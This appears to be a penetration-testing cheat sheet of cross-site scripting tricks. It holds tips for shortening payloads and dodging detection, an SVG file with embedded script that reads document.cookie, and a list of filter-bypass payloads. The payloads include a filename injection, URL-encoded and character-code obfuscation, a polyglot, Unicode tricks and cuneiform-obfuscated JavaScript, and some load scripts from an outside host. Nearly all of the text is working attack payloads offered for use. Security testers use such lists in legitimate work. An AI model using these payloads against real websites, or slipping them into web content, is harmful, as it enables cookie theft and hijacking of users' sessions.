# XSS Tricks/Bypasses

### Tips

* `http(s)://` can be shortened to `//` or `/\\` or `\\`.
* `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
* alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
* You can use `//` to close a tag instead of `>`.
* I have found that `confirm` is the least detected pop-up function so stop using `alert`.
* Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
* The shortest HTML context XSS payload is `<script src=//14.rs>` \(19 chars\)

### XSS inside SVG file

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	<script type="text/javascript">
		alert(document.cookie);
	</script>
</svg>
```

### Nice payloads/bypasses

```javascript
//XSS in filename
><img src=x onerror=alert(document.cookie)>.png

//XSS bypass using urlencode
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">

//XSS using eval() and fromCharCode
<img onload="javascript:alert(String.fromCharCode(97,108,101,114,116,40,39,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,39,41,59))">

//XSS in hidden input
<input type="hidden" accesskey="X" onclick="alert(1)">
##Use CTRL+SHIFT+X to trigger the onclick event

//Polyglot XSS
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>

//Custom1
;location=/javascript:alert%25281%2529/.source; :>

//Custom2
<p/oncopy=eval("Set"+".constructor"+"('ale'+'rt"+"`_XSS!_`')()")>_XSS!_

//\uffff
<scr\uffffipt>alert(0)</script>

//Unicode 's' character
<ſcript/src=//127.0.0.1/xss.js>

//Cuneiform-alphabet payload
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

